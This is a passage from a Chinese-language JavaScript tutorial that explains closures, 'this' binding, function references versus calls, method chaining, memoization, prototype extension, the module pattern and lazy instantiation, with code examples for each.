<p>首先在<code>a</code>函数内定义了2个变量，1个是存储参数，另外一个是闭包结构，在闭包结构中保存着<code>b</code>函数内的<code>a</code>变量，默认情况下，当<code>a</code>函数调用完之后<code>a</code>变量会自动销毁的，但是由于闭包的影响，闭包中使用了外界的变量，因此<code>a</code>变量会一直保存在内存当中，因此变量<code>a</code>参数没有随着<code>a</code>函数销毁而被释放，因此引申出闭包的缺点是：过多的使用闭包会占有内存资源，或内存溢出等肯能性；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 经典的闭包实列如下：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span>&#123;              <span class="comment">//外部函数</span></span><br><span class="line">    <span class="keyword">var</span> a = x;              <span class="comment">// 外部函数的局部变量，并传递参数</span></span><br><span class="line">    <span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;     <span class="comment">// 内部函数</span></span><br><span class="line">        <span class="keyword">return</span> a;           <span class="comment">// 访问外部函数中的局部变量</span></span><br><span class="line">    &#125;;</span><br><span class="line">    a++;                    <span class="comment">// 访问后，动态更新外部函数的变量</span></span><br><span class="line">    <span class="keyword">return</span> b;               <span class="comment">// 返回内部函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> c = f(<span class="number">5</span>);               <span class="comment">// 调用外部函数并且赋值</span></span><br><span class="line"><span class="built_in">console</span>.log(c());           <span class="comment">// 调用内部函数，返回外部函数更新后的值为6</span></span><br></pre></td></tr></table></figure>
<p>下面我们来看看如下使用闭包的列子</p>
<p>在如下代码中有2个函数，<code>f</code>函数的功能是：把数组类型的参数中每个元素的值分别封装在闭包结构中，然后把闭包存储在一个数组中，并返回这个数组，但是在函数e中调用函数f并向其传递一个数组<code>[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</code>,然后遍历返回函数f返回数组，我们运行打印后发现都是<code>c undefined</code>，那是因为在执行f函数中的循环时候，把值虽然保存在<code>temp</code>中，但是每次循环后<code>temp</code>值在不断的变化，当<code>for</code>循环结束后，此时<code>temp</code>值为<code>c</code>，同时<code>i</code>变为3，因此当调用的时候 打印出来的是<code>temp</code>为3，<code>arrs[3</code>]变为<code>undefined</code>；因此打印出 <code>c undefined</code></p>
<p>解决闭包的缺陷我们可以再在外面包一层函数，每次循环的时候，把<code>temp</code>参数和i参数传递进去 如代码二</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码一</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrs = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> temp = x[i];</span><br><span class="line">        arrs.push(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(temp + <span class="string">' '</span> +x[i]); <span class="comment">// c undefined</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arrs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ar = f([<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,ilen = ar.length; i &lt; ilen; i++) &#123;</span><br><span class="line">        ar[i]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">e();</span><br><span class="line"><span class="comment">// 代码二：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrs = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> temp = x[i];</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params">temp,i</span>)</span>&#123;</span><br><span class="line">            arrs.push(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(temp + <span class="string">' '</span> +x[i]); <span class="comment">// c undefined</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)(temp,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arrs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ar = f2([<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,ilen = ar.length; i &lt; ilen; i++) &#123;</span><br><span class="line">        ar[i]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">e2();</span><br></pre></td></tr></table></figure>
<h3 id="三：javascript中的this详解"><a href="#三：javascript中的this详解" class="headerlink" title="三：javascript中的this详解"></a>三：javascript中的this详解</h3><p><code>this</code>的指向常见的有如下几点需要常用到：</p>
<ul>
<li>全局对象的<code>this</code>是指向与window；</li>
<li>作为普通函数调用。</li>
<li>作为对象方法调用。</li>
<li>构造器调用。</li>
<li><code>Function.prototype.call</code> 或 <code>Function.prototype.apply</code>调用。</li>
</ul>
<p>下面我们分别来介绍一下：</p>
<h4 id="1-全局对象的this；"><a href="#1-全局对象的this；" class="headerlink" title="1. 全局对象的this；"></a>1. 全局对象的<code>this</code>；</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// this指向于window</span></span><br><span class="line">setTimeout() 和 setInterval()函数内部的<span class="keyword">this</span>指针是指向于<span class="built_in">window</span>的，如下代码：</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">11</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// true</span></span><br><span class="line">    <span class="keyword">this</span>.test(); <span class="comment">// 11</span></span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>
<h4 id="2-作为普通函数调用；"><a href="#2-作为普通函数调用；" class="headerlink" title="2. 作为普通函数调用；"></a>2. 作为普通函数调用；</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"longen"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test()); <span class="comment">// longen</span></span><br></pre></td></tr></table></figure>
<p class="tip">当作为普通函数调用时候，<code>this</code>总是指向了全局对象，在浏览器当中，全局对象一般指的是<code>window</code>；</p>

<h4 id="3-作为对象的方法调用。"><a href="#3-作为对象的方法调用。" class="headerlink" title="3. 作为对象的方法调用。"></a>3. 作为对象的方法调用。</h4><p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"我的花名改为云溪了，就是为了好玩"</span>,</span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 在这里this指向于obj对象了</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name); <span class="comment">// 打印 我的花名改为云溪了，就是为了好玩</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.getName(); <span class="comment">// 对象方法调用</span></span><br></pre></td></tr></table></figure>
<p>但是呢，我们不能像如下一样调用对象了，如下调用对象的话，<code>this</code>还是执行了<code>window</code>，如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"全局对象名字"</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"我的花名改为云溪了，就是为了好玩"</span>,</span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>);  <span class="comment">// window</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name); <span class="comment">// 全局对象名字</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> yunxi = obj.getName;</span><br><span class="line">yunxi();</span><br></pre></td></tr></table></figure>
<p>运行<code>yunxi()</code>函数，还是会像调用普通函数一样，<code>this</code>指向了<code>window</code>的；</p>
<h4 id="4-构造器调用。"><a href="#4-构造器调用。" class="headerlink" title="4. 构造器调用。"></a>4. 构造器调用。</h4><p>Javascript中不像Java一样，有类的概念，而JS中只能通过构造器创建对象，通过<code>new</code> 对象，当<code>new</code>运算符调用函数时候，该函数会返回一个对象，一般情况下，构造器里面的this就是指向返回的这个对象；</p>
<p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Obj = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">"yunxi"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> Obj();</span><br><span class="line"><span class="built_in">console</span>.log(test.name); <span class="comment">// yunxi</span></span><br></pre></td></tr></table></figure>
<p>注意：构造器函数第一个字母需要大写，这是为了区分普通函数还是构造器函数而言；</p>
<p>如上代码：通过调用 <code>new Obj()</code>方法 返回值保存到<code>test</code>变量中，那么<code>test</code>就是那个对象了，所以内部的<code>this</code>就指向与test对象了，因此<code>test.name</code>就引用到了内部的<code>this.name</code> 即输出 <code>“yunxi”</code>字符串；</p>
<p>但是也有例外的情况，比如构造器显示地返回了一个对象的话，那么这次继续调用的话，那么会最终会返回这个对象，比如如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">"yunxi"</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">"age"</span>: <span class="string">"27"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> obj();</span><br><span class="line"><span class="built_in">console</span>.log(test.name); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>那么继续调用的话，会返回<code>unedfined</code>，因为返回的是那个对象，对象里面没有name这个属性，因此值为<code>undefined</code>；</p>
<h3 id="四：理解函数引用和函数调用的区别"><a href="#四：理解函数引用和函数调用的区别" class="headerlink" title="四：理解函数引用和函数调用的区别"></a>四：理解函数引用和函数调用的区别</h3><p>看下面的代码分析:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数引用 代码一</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = f;</span><br><span class="line"><span class="keyword">var</span> b = f;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a===b); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 函数调用 代码二</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a2 = f2();</span><br><span class="line"><span class="keyword">var</span> b2 = f2();</span><br><span class="line"><span class="built_in">console</span>.log(a2 === b2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数调用 代码三</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a3 = f3();</span><br><span class="line"><span class="keyword">var</span> b3 = f3();</span><br><span class="line"><span class="built_in">console</span>.log(a3 === b3); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>如上的代码：代码一和代码二分部是函数引用和函数调用的列子，返回都为<code>true</code>，代码三也是函数调用的列子，返回且为<code>false</code></p>
<p>我们现在来理解下函数引用和函数调用的本质区别：当引用函数时候，多个变量内存存储的是函数的相同的入口指针，因此对于同一个函数来讲，无论多少个变量引用，他们都是相等的，因为对于引用类型(对象，数组，函数等)都是比较的是内存地址，如果他们内存地址一样的话，说明是相同的；但是对于函数调用来讲，比如代码三;每次调用的时候，都被分配一个新的内存地址，所以他们的内存地址不相同，因此他们会返回<code>false</code>，但是对于代码二来讲，我们看到他们没有返回函数，只是返回数值，他们比较的不是内存地址，而是比较值，所以他们的值相等，因此他们也返回<code>true</code>，我们也可以看看如下实列化一个对象的列子，他们也被分配到不同的内存地址，因此他们也是返回<code>false</code>的；如下代码测试：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.x = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> F();</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> F();</span><br><span class="line"><span class="built_in">console</span>.log(a === b); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h3 id="五：理解js中的链式调用"><a href="#五：理解js中的链式调用" class="headerlink" title="五：理解js中的链式调用"></a>五：理解js中的链式调用</h3><p>我们使用jquery的时候，jquery的简单的语法及可实现链式调用方法，现在我们自己也封装一个链式调用的方法，来理解下 jquery中如何封装链式调用 无非就是每次调用一个方法的时候 给这个方法返回this即可，this指向该对象自身，我们看看代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个简单的对象，每次调用对象的方法的时候，该方法都返回该对象自身</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    a: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"输出a"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    b:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"输出b"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(obj.a().b()); <span class="comment">// 输出a 输出b 输出this指向与obj这个对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面我们再看下 上面的通过Function扩展类型添加方法的demo如下：</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.method = <span class="function"><span class="keyword">function</span>(<span class="params">name,func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.prototype[name]) &#123;</span><br><span class="line">        <span class="keyword">this</span>.prototype[name] = func;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'trim'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>,<span class="string">''</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'log2'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"链式调用"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'r'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="regexp">/a/</span>,<span class="string">''</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">" abc "</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.trim().log2().r()); <span class="comment">// 输出链式调用和 bc</span></span><br></pre></td></tr></table></figure>
<h3 id="六：理解使用函数实现历史记录–提高性能"><a href="#六：理解使用函数实现历史记录–提高性能" class="headerlink" title="六：理解使用函数实现历史记录–提高性能"></a>六：理解使用函数实现历史记录–提高性能</h3><p>函数可以使用对象去记住先前操作的结果，从而避免多余的运算。比如我们现在测试一个费波纳茨的算法，我们可以使用递归函数计算fibonacci数列，一个fibonacci数字是之前两个fibonacci数字之和，最前面的两个数字是0和1；代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">var</span> fibonacci = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="keyword">return</span> n &lt; <span class="number">2</span> ? n : fibonacci(n<span class="number">-1</span>) + fibonacci(n<span class="number">-2</span>);</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i+=<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i+<span class="string">":"</span>+fibonacci(i));</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">console</span>.log(count); <span class="comment">// 453</span></span><br></pre></td></tr></table></figure>
<p>我们可以看到如上 fibonacci函数总共调用了453次，for循环了11次，它自身调用了442次，如果我们使用下面的记忆函数的话，那么就可以减少他们的运算次数，从而提高性能；</p>
<p>思路：先使用一个临时数组保存存储结果，当函数被调用的时候，先看是否已经有存储结果 如果有的话，就立即返回这个存储结果，否则的话，调用函数运算下；代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> fibonacci2 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> memo = [<span class="number">0</span>,<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> result = memo[n];</span><br><span class="line">        count2++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> result !== <span class="string">'number'</span>) &#123;</span><br><span class="line">            result = fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>);</span><br><span class="line">            memo[n] = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> fib;</span><br><span class="line"> &#125;)();</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt;= <span class="number">10</span>; j+=<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(j+<span class="string">":"</span>+fibonacci2(j));</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">console</span>.log(count2); <span class="comment">// 29</span></span><br></pre></td></tr></table></figure>
<p>这个函数也返回了同样的结果，但是只调用了函数29次，循环了11次，也就是说函数自身调用了18次，从而减少无谓的函数的调用及运算，下面我们可以把这个函数进行抽象化，以构造带记忆功能的函数，如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> memoizer = <span class="function"><span class="keyword">function</span>(<span class="params">memo,formula</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> recur = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> result = memo[n];</span><br><span class="line">        count3++;   <span class="comment">// 这句代码只是说明运行函数多少次，在代码中并无作用，实际使用上可以删掉</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> result !== <span class="string">'number'</span>) &#123;</span><br><span class="line">            result = formula(recur,n);</span><br><span class="line">            memo[n] = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> recur;</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="keyword">var</span> fibonacci3 = memoizer([<span class="number">0</span>,<span class="number">1</span>],<span class="function"><span class="keyword">function</span>(<span class="params">recur,n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> recur(n<span class="number">-1</span>) + recur(n<span class="number">-2</span>);</span><br><span class="line"> &#125;);</span><br><span class="line"> <span class="comment">// 调用方式如下</span></span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt;=<span class="number">10</span>; k+=<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(k+<span class="string">":"</span>+fibonacci3(k));</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">console</span>.log(count3); <span class="comment">// 29</span></span><br></pre></td></tr></table></figure>
<p>如上封装 memoizer 里面的参数是实现某个方法的计算公式，具体的可以根据需要自己手动更改，这边的思路无非就是想习惯使用对象去保存临时值，从而减少不必要的取值存储值的操作；</p>
<h3 id="七：理解通过Function扩展类型"><a href="#七：理解通过Function扩展类型" class="headerlink" title="七：理解通过Function扩展类型"></a>七：理解通过Function扩展类型</h3><p>javascript 允许为语言的基本数据类型定义方法。通过Object.prototype添加原型方法，该方法可被所有的对象使用。</p>
<p>这对函数，字符串，数字，正则和布尔值都适用，比如如下现在给Function.prototype增加方法，使该方法对所有函数都可用，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.method = <span class="function"><span class="keyword">function</span>(<span class="params">name,func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.prototype[name]) &#123;</span><br><span class="line">        <span class="keyword">this</span>.prototype[name] = func;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Number</span>.method(<span class="string">'integer'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>[<span class="keyword">this</span> &lt; <span class="number">0</span> ? <span class="string">'ceil'</span> : <span class="string">'floor'</span>](<span class="keyword">this</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log((<span class="number">-10</span>/<span class="number">3</span>).integer()); <span class="comment">// -3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'trim'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>,<span class="string">''</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">" abc "</span>.trim()); <span class="comment">// abc</span></span><br></pre></td></tr></table></figure>
<h3 id="八：理解使用模块模式编写代码"><a href="#八：理解使用模块模式编写代码" class="headerlink" title="八：理解使用模块模式编写代码"></a>八：理解使用模块模式编写代码</h3><p>使用函数和闭包可以构建模块，所谓模块，就是一个提供接口却隐藏状态与实现的函数或对象。使用函数构建模块的优点是：减少全局变量的使用；</p>
<p>比如如下：我想为<code>String</code>扩展一个方法，该方法的作用是寻找字符串中的<code>HTML</code>字符字体并将其替换为对应的字符；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如下代码：</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.method = <span class="function"><span class="keyword">function</span>(<span class="params">name,func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.prototype[name]) &#123;</span><br><span class="line">        <span class="keyword">this</span>.prototype[name] = func;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'deentityify'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> entity = &#123;</span><br><span class="line">        quot: <span class="string">'"'</span>,</span><br><span class="line">        It: <span class="string">'&lt;'</span>,</span><br><span class="line">        gt: <span class="string">'&gt;'</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="regexp">/&amp;([^&amp;;]+);/g</span>,<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> r = entity[b];</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">typeof</span> r === <span class="string">'string'</span> ? r : a;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;());</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"&amp;It;&amp;quot;&amp;gt;"</span>.deentityify()); <span class="comment">// &lt;"&gt;</span></span><br></pre></td></tr></table></figure>
<p>模块模式利用函数作用域和闭包来创建绑定对象与私有成员的关联，比如在上面的<code>deentityify()</code>方法才有权访问字符实体表<code>entity</code>这个数据对象；</p>
<p>模块开发的一般形式是：定义了私有变量和函数的函数，利用闭包创建可以访问到的私有变量和函数的特权函数，最后返回这个特权函数，或把他们保存到可以访问的地方。</p>
<p>模块模式一般会结合实例模式使用。javascript的实例就是使用对象字面量表示法创建的。对象的属性值可以是数值或者函数，并且属性值在该对象的生命周期中不会发生变化；比如如下代码属于模块模式：定义了一个私有变量name属性，和一个实例模式(对象字面量obj)并且返回这个对象字面量obj，对象字面量中的方法与私有变量name进行了绑定；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 比如如下经典的模块模式</span></span><br><span class="line"><span class="keyword">var</span> MODULE = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">"tugenhua"</span>;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        setName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">        &#125;,</span><br><span class="line">        getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;)();</span><br><span class="line">MODULE.setName()</span><br><span class="line"><span class="built_in">console</span>.log(MODULE.getName()); <span class="comment">// tugenhua</span></span><br></pre></td></tr></table></figure>
<h3 id="九：理解惰性实列化"><a href="#九：理解惰性实列化" class="headerlink" title="九：理解惰性实列化"></a>九：理解惰性实列化</h3><p>在页面中javascript初始化执行的时候就实例化类，如果在页面中没有使用这个实列化的对象，就会造成一定的内存浪费和性能损耗；这时候，我们可以使用惰性实列化来解决这个问题，惰性就是把实列化推迟到需要使用它的时候才去做，做到 “按需供应”;</p>
